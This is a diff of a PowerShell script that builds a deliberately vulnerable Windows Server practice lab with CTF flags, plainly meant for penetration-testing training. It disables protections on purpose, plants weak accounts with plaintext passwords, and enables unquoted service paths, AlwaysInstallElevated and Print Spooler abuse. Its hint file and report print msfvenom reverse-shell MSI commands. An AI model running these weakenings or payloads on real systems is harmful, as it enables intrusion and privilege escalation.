@@ -1,17 +1,16 @@
-# Windows Server 2019 Vulnerable Lab Configuration Script with CTF Flags
+# Windows Server 2019 Vulnerable Lab Configuration Script v3 with Pokemon CTF Flags
 # WARNING: FOR ISOLATED LAB ENVIRONMENT ONLY - NEVER USE IN PRODUCTION
 # This script intentionally creates security vulnerabilities and CTF flags for penetration testing practice
 
 param(
     [string]$LabPassword = "Password123!",
     [string]$NetworkPrinter = "192.168.1.100",
-    [string]$TeamIdentifier = "CTF2024",
     [switch]$GenerateFlagReport
 )
 
 Write-Host "==========================================" -ForegroundColor Red
-Write-Host "VULNERABLE LAB CONFIGURATION SCRIPT" -ForegroundColor Red
-Write-Host "WITH CTF FLAG SYSTEM" -ForegroundColor Red
+Write-Host "VULNERABLE LAB CONFIGURATION SCRIPT v3" -ForegroundColor Red
+Write-Host "WITH POKEMON CTF FLAG SYSTEM" -ForegroundColor Red
 Write-Host "FOR EDUCATIONAL PURPOSES ONLY" -ForegroundColor Red
 Write-Host "NEVER USE IN PRODUCTION ENVIRONMENTS" -ForegroundColor Red
 Write-Host "==========================================" -ForegroundColor Red
@@ -23,22 +22,50 @@ if ($confirm -ne "VULNERABLE") { exit }
 $global:FlagList = @()
 $global:FlagCounter = 1
 
-# Function to generate and place flags
+# Pokemon list for deterministic flag generation
+$PokemonList = @(
+    "PIKACHU", "CHARIZARD", "BULBASAUR", "SQUIRTLE", "MEWTWO",
+    "GENGAR", "DRAGONITE", "SNORLAX", "ALAKAZAM", "MACHAMP",
+    "GYARADOS", "LAPRAS", "EEVEE", "VAPOREON", "JOLTEON",
+    "FLAREON", "ARTICUNO", "ZAPDOS", "MOLTRES", "DRATINI",
+    "MEOWTH", "PSYDUCK", "ARCANINE", "POLIWAG", "ABRA",
+    "MACHOP", "BELLSPROUT", "TENTACOOL", "GEODUDE", "PONYTA",
+    "SLOWPOKE", "MAGNEMITE", "FARFETCH", "DODUO", "SEEL",
+    "GRIMER", "SHELLDER", "GASTLY", "ONIX", "DROWZEE",
+    "KRABBY", "VOLTORB", "EXEGGCUTE", "CUBONE", "HITMONLEE",
+    "LICKITUNG", "KOFFING", "RHYHORN", "CHANSEY", "TANGELA",
+    "KANGASKHAN", "HORSEA", "GOLDEEN", "STARYU", "SCYTHER",
+    "JYNX", "ELECTABUZZ", "MAGMAR", "PINSIR", "TAUROS",
+    "MAGIKARP", "DITTO", "UMBREON", "ESPEON", "PORYGON",
+    "OMANYTE", "KABUTO", "AERODACTYL", "CYNDAQUIL", "TOTODILE",
+    "CHIKORITA", "TYPHLOSION", "FERALIGATR", "MEGANIUM", "FURRET"
+)
+
+# Function to generate deterministic flag based on position
 function New-CTFFlag {
     param(
         [string]$Location,
         [string]$Description,
         [int]$Points,
         [string]$Difficulty,
-        [string]$Technique,
-        [string]$FlagFormat = "FLAG"
+        [string]$Technique
     )
     
-    $flagId = "{0:D3}" -f $global:FlagCounter
-    $flag = "$FlagFormat{$TeamIdentifier-SRV-$flagId}"
+    # Use deterministic selection based on counter
+    $pokemonIndex = ($global:FlagCounter - 1) % $PokemonList.Count
+    $pokemon = $PokemonList[$pokemonIndex]
+    
+    # Generate deterministic 8-digit number using hash of counter and hostname
+    $seed = "SERVER$($global:FlagCounter)$(hostname)"
+    $hash = [System.Security.Cryptography.SHA256]::Create()
+    $hashBytes = $hash.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($seed))
+    $hashInt = [BitConverter]::ToUInt32($hashBytes, 0)
+    $digits = "{0:D8}" -f ($hashInt % 100000000)
+    
+    $flag = "FLAG{$pokemon$digits}"
     
     $global:FlagList += [PSCustomObject]@{
-        FlagID = $flagId
+        FlagID = "{0:D3}" -f $global:FlagCounter
         Flag = $flag
         Location = $Location
         Description = $Description
@@ -65,7 +92,9 @@ function Create-WeakUsers {
         @{Name="backup"; Password="backup123"; Groups=@("Backup Operators"); Description="Backup Service Account"},
         @{Name="service"; Password="service"; Groups=@("Users"); Description="Service Account"},
         @{Name="test"; Password="test"; Groups=@("Users"); Description="Test Account"},
-        @{Name="sqlservice"; Password="sql2019"; Groups=@("Users"); Description="SQL Service Account"}
+        @{Name="sqlservice"; Password="sql2019"; Groups=@("Users"); Description="SQL Service Account"},
+        @{Name="svc_print"; Password="PrintService123"; Groups=@("Users"); Description="Print Service Account"},
+        @{Name="svc_mssql"; Password="Summer2019!"; Groups=@("Users"); Description="SQL Service for Kerberoasting"}
     )
     
     foreach ($user in $users) {
@@ -201,49 +230,168 @@ function Configure-VulnerableSMB {
     Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters" -Name "RestrictNullSessAccess" -Value 0
 }
 
-# Function to install and configure vulnerable FTP with flags
-function Configure-VulnerableFTP {
-    Write-Host "Installing and configuring vulnerable FTP with flags..." -ForegroundColor Yellow
+# Function to create multiple unquoted service paths
+function Create-UnquotedServicePaths {
+    Write-Host "Creating unquoted service path vulnerabilities with flags..." -ForegroundColor Yellow
     
-    # Install IIS with FTP
-    Enable-WindowsOptionalFeature -Online -FeatureName "IIS-WebServerRole", "IIS-FTPServer", "IIS-FTPSvc" -All -NoRestart
+    # Service 1 - Basic unquoted path
+    $unquotedFlag1 = New-CTFFlag -Location "Unquoted Service Path" -Description "Vulnerable Scanner Service exploitation" -Points 25 -Difficulty "Easy" -Technique "Unquoted service path"
     
-    # Create FTP root
-    New-Item -Path "C:\inetpub\ftproot" -ItemType Directory -Force
-    New-Item -Path "C:\inetpub\ftproot\upload" -ItemType Directory -Force
-    New-Item -Path "C:\inetpub\ftproot\hidden" -ItemType Directory -Force
+    New-Item -Path "C:\Program Files\Vulnerable Scanner" -ItemType Directory -Force
+    New-Item -Path "C:\Program Files\Vulnerable Scanner\bin" -ItemType Directory -Force
+    "echo $unquotedFlag1 > C:\flag_unquoted1.txt" | Out-File "C:\Program Files\Vulnerable Scanner\bin\scanner.bat"
     
-    # Place FTP flag
-    $ftpFlag = New-CTFFlag -Location "FTP Server" -Description "Anonymous FTP access" -Points 15 -Difficulty "Easy" -Technique "FTP enumeration"
-    $ftpFlag | Out-File "C:\inetpub\ftproot\readme.txt"
+    sc.exe create "VulnScanner" binpath= "C:\Program Files\Vulnerable Scanner\bin\scanner.bat" start= auto
+    sc.exe config "VulnScanner" obj= "LocalSystem"
+    sc.exe description "VulnScanner" "Vulnerable Scanner Service - Check for unquoted paths"
     
-    # Hidden directory flag
-    $hiddenFtpFlag = New-CTFFlag -Location "FTP Hidden Directory" -Description "Hidden FTP directory" -Points 25 -Difficulty "Medium" -Technique "FTP directory traversal"
-    $hiddenFtpFlag | Out-File "C:\inetpub\ftproot\hidden\secret_flag.txt"
+    # Service 2 - More complex path
+    $unquotedFlag2 = New-CTFFlag -Location "Unquoted Service Path 2" -Description "Common Application Service exploitation" -Points 30 -Difficulty "Medium" -Technique "Unquoted service path"
     
-    # Configure FTP using appcmd if available
-    $appcmd = "$env:windir\system32\inetsrv\appcmd.exe"
-    if (Test-Path $appcmd) {
-        & $appcmd add site /name:VulnFTP /bindings:ftp://\*:21: /physicalPath:C:\inetpub\ftproot
-        & $appcmd set config -section:system.applicationHost/sites "/[name='VulnFTP'].ftpServer.security.authentication.anonymousAuthentication.enabled:true" 
-        & $appcmd set config -section:system.applicationHost/sites "/[name='VulnFTP'].ftpServer.security.authentication.basicAuthentication.enabled:true"
-    }
+    New-Item -Path "C:\Program Files\Common Application\System Tools" -ItemType Directory -Force
+    "echo $unquotedFlag2 > C:\flag_unquoted2.txt" | Out-File "C:\Program Files\Common Application\System Tools\service.exe.bat"
     
-    # Create FTP users
-    New-LocalUser -Name "ftpuser" -Password (ConvertTo-SecureString "ftp123" -AsPlainText -Force) -PasswordNeverExpires -ErrorAction SilentlyContinue
-    New-LocalUser -Name "anonymous" -Password (ConvertTo-SecureString "" -AsPlainText -Force) -PasswordNeverExpires -ErrorAction SilentlyContinue
+    sc.exe create "CommonAppService" binpath= "C:\Program Files\Common Application\System Tools\service.exe" start= auto
+    sc.exe config "CommonAppService" obj= "LocalSystem"
     
-    # Set permissions
-    $acl = Get-Acl "C:\inetpub\ftproot"
-    $permission = "Everyone","FullControl","ContainerInherit,ObjectInherit","None","Allow"
-    $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission
-    $acl.SetAccessRule($accessRule)
-    Set-Acl "C:\inetpub\ftproot" $acl
+    # Service 3 - Hidden in vendor path
+    $unquotedFlag3 = New-CTFFlag -Location "Unquoted Service Path 3" -Description "Vendor Update Service exploitation" -Points 35 -Difficulty "Medium" -Technique "Unquoted service path"
     
-    Write-Host "  FTP server configured with flags" -ForegroundColor Green
+    New-Item -Path "C:\Program Files (x86)\Vendor Software Suite\Update Service" -ItemType Directory -Force
+    "echo $unquotedFlag3 > C:\flag_unquoted3.txt" | Out-File "C:\Program Files (x86)\Vendor Software Suite\Update Service\updater.bat"
+    
+    sc.exe create "VendorUpdater" binpath= "C:\Program Files (x86)\Vendor Software Suite\Update Service\updater.exe" start= auto DisplayName= "Vendor Update Service"
+    sc.exe config "VendorUpdater" obj= "LocalSystem"
+    
+    Write-Host "  Created 3 unquoted service path vulnerabilities with flags" -ForegroundColor Green
 }
 
-# Function to install and configure vulnerable SSH with flags
+# Function to configure AlwaysInstallElevated
+function Configure-AlwaysInstallElevated {
+    Write-Host "Configuring AlwaysInstallElevated vulnerability with flag..." -ForegroundColor Yellow
+    
+    # Enable AlwaysInstallElevated in both HKLM and HKCU
+    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -Value 1 -PropertyType DWORD -Force
+    New-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -Value 1 -PropertyType DWORD -Force
+    
+    # Create flag that will be accessible after MSI privilege escalation
+    $msiFlag = New-CTFFlag -Location "AlwaysInstallElevated" -Description "MSI privilege escalation successful" -Points 40 -Difficulty "Medium" -Technique "AlwaysInstallElevated MSI"
+    
+    # Create a file only readable by SYSTEM that contains the flag
+    $flagPath = "C:\Windows\System32\config\systemprofile\msi_flag.txt"
+    New-Item -Path (Split-Path $flagPath -Parent) -ItemType Directory -Force -ErrorAction SilentlyContinue
+    $msiFlag | Out-File $flagPath -Force
+    
+    # Set ACL so only SYSTEM can read
+    $acl = Get-Acl $flagPath
+    $acl.SetAccessRuleProtection($true, $false)
+    $systemRule = New-Object System.Security.AccessControl.FileSystemAccessRule("SYSTEM", "FullControl", "Allow")
+    $adminRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Administrators", "FullControl", "Allow")
+    $acl.AddAccessRule($systemRule)
+    $acl.AddAccessRule($adminRule)
+    Set-Acl $flagPath $acl
+    
+    # Create a sample MSI in Public folder for students to find
+    $msiInfo = @"
+AlwaysInstallElevated is enabled!
+Generate malicious MSI with: msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f msi > shell.msi
+Or use: msiexec /quiet /qn /i malicious.msi
+Flag location hint: Check SYSTEM profile directory after escalation
+"@
+    $msiInfo | Out-File "C:\Public\msi_hint.txt"
+    
+    Write-Host "  AlwaysInstallElevated configured with flag" -ForegroundColor Green
+}
+
+# Function to configure Print Spooler vulnerabilities
+function Configure-PrintSpoolerVulnerabilities {
+    Write-Host "Configuring Print Spooler vulnerabilities with flags..." -ForegroundColor Yellow
+    
+    # Ensure Print Spooler is running
+    Set-Service -Name "Spooler" -StartupType Automatic
+    Start-Service -Name "Spooler" -ErrorAction SilentlyContinue
+    
+    # Enable Point and Print without warnings (CVE-2021-34527 related)
+    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Force | Out-Null
+    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Name "NoWarningNoElevationOnInstall" -Value 1 -PropertyType DWORD -Force
+    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Name "UpdatePromptSettings" -Value 2 -PropertyType DWORD -Force
+    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Name "RestrictDriverInstallationToAdministrators" -Value 0 -PropertyType DWORD -Force
+    
+    # Create writable spool directory
+    $spoolPath = "C:\Windows\System32\spool\drivers\color"
+    New-Item -Path $spoolPath -ItemType Directory -Force -ErrorAction SilentlyContinue
+    icacls $spoolPath /grant "Everyone:(OI)(CI)F" /T
+    
+    # PrintNightmare flag
+    $spoolerFlag = New-CTFFlag -Location "Print Spooler Exploit" -Description "PrintNightmare exploitation successful" -Points 45 -Difficulty "Hard" -Technique "PrintNightmare/Print Spooler abuse"
+    $spoolerFlag | Out-File "$spoolPath\printnightmare_flag.txt" -Force
+    
+    # Create vulnerable printer
+    Add-PrinterDriver -Name "Generic / Text Only" -ErrorAction SilentlyContinue
+    Add-PrinterPort -Name "FILE:" -ErrorAction SilentlyContinue
+    Add-Printer -Name "VulnerablePrinter" -DriverName "Generic / Text Only" -PortName "FILE:" -Shared -ShareName "VulnPrinter" -PermissionSDDL "O:BAG:DUD:(A;;LCSWSDRCWDWO;;;WD)" -ErrorAction SilentlyContinue
+    
+    # Set weak permissions on printer
+    $printerSD = "O:BAG:BAD:(A;;LCSWSDRCWDWOCRSDDT;;;WD)(A;;LCSWSDRCWDWOCRSDDT;;;AC)"
+    Set-Printer -Name "VulnerablePrinter" -PermissionSDDL $printerSD -ErrorAction SilentlyContinue
+    
+    # Create SpoolSample flag
+    $spoolSampleFlag = New-CTFFlag -Location "SpoolSample" -Description "SpoolSample/PetitPotam vector" -Points 40 -Difficulty "Hard" -Technique "Coerced authentication via Print Spooler"
+    New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Spooler" -Name "SpoolSampleFlag" -Value $spoolSampleFlag -Force
+    
+    Write-Host "  Print Spooler vulnerabilities configured with flags" -ForegroundColor Green
+    Write-Host "  Note: PrintNightmare and SpoolSample attacks enabled" -ForegroundColor Yellow
+}
+
+# Function to configure Kerberoasting vulnerabilities
+function Configure-Kerberoasting {
+    Write-Host "Configuring Kerberoasting vulnerabilities with flags..." -ForegroundColor Yellow
+    
+    # Create SPN for SQL service account (already created in users)
+    # Note: In a domain environment, this would be setspn -a MSSQLSvc/WIN2019-SRV:1433 svc_mssql
+    # For workgroup, we'll simulate with registry entries
+    
+    $kerberoastFlag = New-CTFFlag -Location "Kerberoastable Account" -Description "svc_mssql account cracked" -Points 50 -Difficulty "Hard" -Technique "Kerberoasting"
+    
+    # Create simulated SPN registry entries
+    New-Item -Path "HKLM:\SOFTWARE\KerberoastableAccounts" -Force | Out-Null
+    New-ItemProperty -Path "HKLM:\SOFTWARE\KerberoastableAccounts" -Name "svc_mssql" -Value "MSSQLSvc/WIN2019-SRV:1433" -Force
+    New-ItemProperty -Path "HKLM:\SOFTWARE\KerberoastableAccounts" -Name "svc_mssql_password" -Value "Summer2019!" -Force
+    New-ItemProperty -Path "HKLM:\SOFTWARE\KerberoastableAccounts" -Name "svc_mssql_flag" -Value $kerberoastFlag -Force
+    
+    # Create another kerberoastable service
+    New-LocalUser -Name "svc_http" -Password (ConvertTo-SecureString "Winter2020!" -AsPlainText -Force) -Description "HTTP Service Account" -PasswordNeverExpires -ErrorAction SilentlyContinue
+    New-ItemProperty -Path "HKLM:\SOFTWARE\KerberoastableAccounts" -Name "svc_http" -Value "HTTP/WIN2019-SRV" -Force
+    New-ItemProperty -Path "HKLM:\SOFTWARE\KerberoastableAccounts" -Name "svc_http_password" -Value "Winter2020!" -Force
+    
+    # Create a file with SPN information
+    $spnInfo = @"
+Service Principal Names (SPNs) configured:
+==========================================
+svc_mssql - MSSQLSvc/WIN2019-SRV:1433 - Password: Summer2019!
+svc_http - HTTP/WIN2019-SRV - Password: Winter2020!
+svc_print - SPOOLSV/WIN2019-SRV - Password: PrintService123
+
+Note: In a domain environment, use:
+- GetUserSPNs.py or Rubeus
+- Crack with hashcat: hashcat -m 13100 hash.txt wordlist.txt
+
+Flag: $kerberoastFlag
+"@
+    $spnInfo | Out-File "C:\IT\spn_accounts.txt" -Force
+    
+    # Create weak password hashes file for practice
+    $hashesFile = @"
+`$krb5tgs`$23`$*svc_mssql`$DOMAIN`$MSSQLSvc/WIN2019-SRV:1433*`$[simulated_hash_here]
+`$krb5tgs`$23`$*svc_http`$DOMAIN`$HTTP/WIN2019-SRV*`$[simulated_hash_here]
+"@
+    $hashesFile | Out-File "C:\IT\kerberos_hashes_sample.txt" -Force
+    
+    Write-Host "  Kerberoasting vulnerabilities configured" -ForegroundColor Green
+    Write-Host "  Weak SPN accounts: svc_mssql (Summer2019!), svc_http (Winter2020!)" -ForegroundColor Yellow
+}
+
+# Function to install and configure vulnerable SSH
 function Configure-VulnerableSSH {
     Write-Host "Installing and configuring vulnerable SSH with flags..." -ForegroundColor Yellow
     
@@ -296,53 +444,23 @@ UsePAM no
     Write-Host "  SSH server configured with flags" -ForegroundColor Green
 }
 
-# Function to configure printer with flag
-function Configure-NetworkPrinter {
-    param([string]$PrinterIP)
-    
-    Write-Host "Configuring network printer connection with flag..." -ForegroundColor Yellow
-    
-    # Add printer port
-    Add-PrinterPort -Name "IP_$PrinterIP" -PrinterHostAddress $PrinterIP -ErrorAction SilentlyContinue
-    
-    # Install generic printer driver
-    Add-PrinterDriver -Name "Generic / Text Only" -ErrorAction SilentlyContinue
-    
-    # Printer flag in comment
-    $printerFlag = New-CTFFlag -Location "Printer Properties" -Description "Printer configuration" -Points 20 -Difficulty "Medium" -Technique "Printer enumeration"
-    
-    # Add printer with flag in comment
-    Add-Printer -Name "VulnPrinter" -DriverName "Generic / Text Only" -PortName "IP_$PrinterIP" -Comment $printerFlag -Shared -ShareName "VulnPrinter" -ErrorAction SilentlyContinue
-    
-    # Set permissions
-    $printer = Get-Printer -Name "VulnPrinter" -ErrorAction SilentlyContinue
-    if ($printer) {
-        Set-Printer -Name "VulnPrinter" -PermissionSDDL "O:BAG:DUD:(A;OIIO;RPWPDTSDWD;;;WD)" -ErrorAction SilentlyContinue
-        Write-Host "  Printer configured with flag" -ForegroundColor Green
-    }
-}
-
 # Function to create vulnerable services with flags
 function Create-VulnerableServices {
-    Write-Host "Creating vulnerable services with flags..." -ForegroundColor Yellow
+    Write-Host "Creating additional vulnerable services with flags..." -ForegroundColor Yellow
     
-    # Create a service running as SYSTEM with unquoted path
-    New-Item -Path "C:\Program Files\Vulnerable Service" -ItemType Directory -Force
+    # Service with weak permissions
+    $svcDescFlag = New-CTFFlag -Location "Service Description" -Description "WeakPermService description" -Points 15 -Difficulty "Easy" -Technique "Service enumeration"
+    sc.exe create WeakPermService binpath= "C:\Windows\System32\cmd.exe /c echo vulnerable" start= auto
+    sc.exe description WeakPermService "Weak Permission Service - $svcDescFlag"
+    sc.exe sdset WeakPermService "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;PU)(A;;RPWP;;;WD)"
     
-    # Service flag
-    $serviceFlag = New-CTFFlag -Location "Vulnerable Service" -Description "Unquoted service path exploitation" -Points 35 -Difficulty "Medium" -Technique "Service exploitation"
-    "echo $serviceFlag > C:\flag_service.txt" | Out-File "C:\Program Files\Vulnerable Service\service.bat"
+    # Service that can be modified by users
+    $modifiableFlag = New-CTFFlag -Location "Modifiable Service" -Description "UserModifiableService exploitation" -Points 30 -Difficulty "Medium" -Technique "Service modification"
+    sc.exe create UserModifiableService binpath= "C:\Windows\System32\notepad.exe" start= auto
+    sc.exe sdset UserModifiableService "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;AU)(A;;CCLCSWLOCRRC;;;IU)"
+    New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\UserModifiableService" -Name "Flag" -Value $modifiableFlag -Force
     
-    sc.exe create VulnService binpath= "C:\Program Files\Vulnerable Service\service.bat" start= auto
-    sc.exe config VulnService obj= "LocalSystem"
-    
-    # Service with flag in description
-    $svcDescFlag = New-CTFFlag -Location "Service Description" -Description "WeakService description" -Points 15 -Difficulty "Easy" -Technique "Service enumeration"
-    sc.exe create WeakService binpath= "C:\Windows\System32\cmd.exe /c echo vulnerable" start= auto
-    sc.exe description WeakService "Weak Service - $svcDescFlag"
-    sc.exe sdset WeakService "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;PU)(A;;RPWP;;;WD)"
-    
-    Write-Host "  Vulnerable services created with flags" -ForegroundColor Green
+    Write-Host "  Additional vulnerable services created" -ForegroundColor Green
 }
 
 # Function to configure scheduled tasks with flags
@@ -412,7 +530,7 @@ function Create-RegistryFlags {
     
     # Hard flag in service registry
     $regFlag3 = New-CTFFlag -Location "Registry Service" -Description "Service ImagePath" -Points 35 -Difficulty "Hard" -Technique "Service registry analysis"
-    New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\VulnService" -Name "Flag" -Value $regFlag3 -Force
+    New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\VulnScanner" -Name "Flag" -Value $regFlag3 -Force
     
     Write-Host "  Registry flags created" -ForegroundColor Green
 }
@@ -560,17 +678,36 @@ while (`$true) {
     Write-Host "  Process flag created" -ForegroundColor Green
 }
 
+# Function to enable legacy protocols
+function Enable-LegacyProtocols {
+    Write-Host "Enabling legacy protocols..." -ForegroundColor Yellow
+    
+    # Enable LLMNR
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name EnableMulticast -Value 1 -ErrorAction SilentlyContinue
+    
+    # Enable NetBIOS
+    $adapters = Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "IPEnabled=true"
+    foreach ($adapter in $adapters) {
+        $adapter.SetTcpipNetbios(1) | Out-Null
+    }
+    
+    # Enable WPAD
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name AutoDetect -Value 1
+    
+    Write-Host "  Legacy protocols enabled" -ForegroundColor Green
+}
+
 # Function to generate flag documentation
 function Generate-FlagReport {
     Write-Host "`nGenerating flag report..." -ForegroundColor Cyan
     
-    $reportPath = "C:\CTF_FLAGS_REPORT_$(Get-Date -Format 'yyyyMMdd_HHmmss').html"
+    $reportPath = "C:\CTF_FLAGS_SERVER_$(Get-Date -Format 'yyyyMMdd_HHmmss').html"
     
     $html = @"
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CTF Flag Report - $(hostname)</title>
+    <title>CTF Flag Report - Server v3 - $(hostname)</title>
     <style>
         body { font-family: Arial; margin: 20px; background: #f0f0f0; }
         .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; }
@@ -584,11 +721,26 @@ function Generate-FlagReport {
         .hard { color: red; font-weight: bold; }
         .stats { background: #e7f4ff; padding: 15px; border-radius: 5px; margin: 20px 0; }
         .flag-code { font-family: 'Courier New'; background: #f0f0f0; padding: 2px 5px; border-radius: 3px; }
+        .pokemon-theme { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 10px; border-radius: 5px; margin-bottom: 20px; }
+        .new-vulns { background: #d4edda; border-left: 5px solid #28a745; padding: 10px; margin: 20px 0; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>CTF Flag Report - $(hostname)</h1>
+        <div class="pokemon-theme">
+            <h1 style="color: white; border: none;">🎮 Pokemon CTF Flag Report v3 - Windows Server 2019 🎮</h1>
+        </div>
+        
+        <div class="new-vulns">
+            <h3>New Vulnerabilities in v3:</h3>
+            <ul>
+                <li><strong>Unquoted Service Paths:</strong> Multiple services with unquoted paths</li>
+                <li><strong>AlwaysInstallElevated:</strong> MSI privilege escalation to SYSTEM</li>
+                <li><strong>Print Spooler:</strong> PrintNightmare and SpoolSample vulnerabilities</li>
+                <li><strong>Kerberoasting:</strong> Weak SPN accounts (svc_mssql, svc_http)</li>
+            </ul>
+        </div>
+        
         <div class="stats">
             <h2>Statistics</h2>
             <p><strong>Total Flags:</strong> $($global:FlagList.Count)</p>
@@ -600,6 +752,7 @@ function Generate-FlagReport {
         </div>
         
         <h2>Flag Details</h2>
+        <p><strong>Note:</strong> All flags use the format FLAG{POKEMON########} where the Pokemon name and 8-digit code are deterministic and will never change.</p>
         <table>
             <thead>
                 <tr>
@@ -634,19 +787,41 @@ function Generate-FlagReport {
             </tbody>
         </table>
         
-        <h2>Hints for Students</h2>
+        <h2>Attack Techniques Guide</h2>
+        <h3>Unquoted Service Paths:</h3>
         <ul>
-            <li><strong>Easy (10-15 points):</strong> Basic enumeration, service discovery, file searching</li>
-            <li><strong>Medium (20-30 points):</strong> Exploitation, credential access, privilege escalation</li>
-            <li><strong>Hard (35-40 points):</strong> Advanced techniques, memory analysis, complex exploitation</li>
+            <li>Use: <code>wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v '\"'</code></li>
+            <li>Exploit by placing malicious exe in: C:\Program.exe or C:\Program Files\Common.exe</li>
+        </ul>
+        
+        <h3>AlwaysInstallElevated:</h3>
+        <ul>
+            <li>Check: <code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></li>
+            <li>Generate MSI: <code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi > shell.msi</code></li>
+            <li>Execute: <code>msiexec /quiet /qn /i shell.msi</code></li>
+        </ul>
+        
+        <h3>Print Spooler (PrintNightmare):</h3>
+        <ul>
+            <li>Check: <code>Get-Service -Name Spooler</code></li>
+            <li>Exploit using CVE-2021-34527 tools</li>
+            <li>SpoolSample for coerced authentication</li>
+        </ul>
+        
+        <h3>Kerberoasting:</h3>
+        <ul>
+            <li>Find SPNs: <code>setspn -T domain -Q */*</code></li>
+            <li>Request tickets: <code>Add-Type -AssemblyName System.IdentityModel</code></li>
+            <li>Use Rubeus or GetUserSPNs.py</li>
+            <li>Crack with: <code>hashcat -m 13100 hash.txt wordlist.txt</code></li>
         </ul>
         
         <h2>Recommended Tools</h2>
         <ul>
-            <li>Enumeration: nmap, enum4linux, smbclient, gobuster</li>
-            <li>Exploitation: Metasploit, Impacket, Evil-WinRM</li>
-            <li>Post-Exploitation: Mimikatz, PowerView, BloodHound</li>
-            <li>Analysis: strings, file, PowerShell, Process Explorer</li>
+            <li><strong>Enumeration:</strong> WinPEAS, Seatbelt, PowerUp</li>
+            <li><strong>Exploitation:</strong> Metasploit, PowerSploit, Rubeus</li>
+            <li><strong>Kerberos:</strong> Impacket suite, Rubeus, kerbrute</li>
+            <li><strong>Persistence:</strong> SharPersist, PowerShell Empire</li>
         </ul>
     </div>
 </body>
@@ -659,14 +834,19 @@ function Generate-FlagReport {
     $csvPath = $reportPath -replace '\.html$', '.csv'
     $global:FlagList | Export-Csv -Path $csvPath -NoTypeInformation
     
+    # Create a simple text file with just the flags for easy import to scoring system
+    $flagsOnlyPath = $reportPath -replace '\.html$', '_flags_only.txt'
+    $global:FlagList | ForEach-Object { $_.Flag } | Out-File $flagsOnlyPath -Encoding UTF8
+    
     Write-Host "  Flag report saved to: $reportPath" -ForegroundColor Green
     Write-Host "  CSV report saved to: $csvPath" -ForegroundColor Green
+    Write-Host "  Flags only file saved to: $flagsOnlyPath" -ForegroundColor Green
     
     return $reportPath
 }
 
 # Main execution
-Write-Host "`nStarting vulnerable server configuration with CTF flags..." -ForegroundColor Cyan
+Write-Host "`nStarting vulnerable server configuration v3 with Pokemon CTF flags..." -ForegroundColor Cyan
 Write-Host "========================================" -ForegroundColor Cyan
 
 # Run all configurations
@@ -674,9 +854,11 @@ Create-WeakUsers
 Disable-SecurityFeatures
 Configure-VulnerableRDP
 Configure-VulnerableSMB
-Configure-VulnerableFTP
+Create-UnquotedServicePaths
+Configure-AlwaysInstallElevated
+Configure-PrintSpoolerVulnerabilities
+Configure-Kerberoasting
 Configure-VulnerableSSH
-Configure-NetworkPrinter -PrinterIP $NetworkPrinter
 Create-VulnerableServices
 Create-VulnerableScheduledTasks
 Create-RegistryFlags
@@ -711,39 +893,36 @@ if ($GenerateFlagReport) {
 }
 
 Write-Host "`n========================================" -ForegroundColor Green
-Write-Host "Server vulnerability and CTF flag configuration complete!" -ForegroundColor Green
+Write-Host "Server vulnerability configuration v3 complete!" -ForegroundColor Green
 Write-Host "========================================" -ForegroundColor Green
 Write-Host ""
-Write-Host "CTF FLAG STATISTICS:" -ForegroundColor Cyan
+Write-Host "NEW VULNERABILITIES IN v3:" -ForegroundColor Cyan
+Write-Host "  ✓ Unquoted Service Paths (3 services)" -ForegroundColor Yellow
+Write-Host "  ✓ AlwaysInstallElevated MSI" -ForegroundColor Yellow
+Write-Host "  ✓ Print Spooler (PrintNightmare)" -ForegroundColor Yellow
+Write-Host "  ✓ Kerberoasting (svc_mssql, svc_http)" -ForegroundColor Yellow
+Write-Host ""
+Write-Host "POKEMON CTF FLAG STATISTICS:" -ForegroundColor Cyan
 Write-Host "  Total Flags Placed: $($global:FlagList.Count)" -ForegroundColor Yellow
 Write-Host "  Total Points Available: $(($global:FlagList | Measure-Object -Property Points -Sum).Sum)" -ForegroundColor Yellow
-Write-Host "  Difficulty Distribution:" -ForegroundColor Yellow
